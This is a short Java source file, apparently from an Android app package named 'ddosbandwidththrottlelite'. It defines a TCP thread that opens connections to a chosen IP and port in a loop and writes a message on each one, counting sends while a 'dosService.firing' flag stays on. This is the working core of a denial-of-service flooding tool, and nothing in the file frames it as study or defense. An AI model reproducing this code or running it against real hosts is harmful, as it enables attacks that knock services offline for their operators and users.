package com.notebook.idealabs.ddosbandwidththrottlelite;

/**
 * Created by Admin on 10-09-2017.
 */

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class TCP implements Runnable {
    public static int count = 0;
    public static long startTime = 0;
    private String ip;
    private String message;
    private int pause;
    private int port;
    private int timeout;

    public TCP(String ip, int port, int timeout, String message, int pause) {
        this.ip = ip;
        this.port = port;
        this.timeout = timeout;
        this.message = message;
        this.pause = pause;
    }

    public void run() {
        count = 0;
        startTime = System.currentTimeMillis();
        while (dosService.firing) {
            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(this.ip, this.port), this.timeout);
                OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
                out.write(this.message);
                out.close();
                socket.close();
                count++;
                Thread.sleep((long) this.pause);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

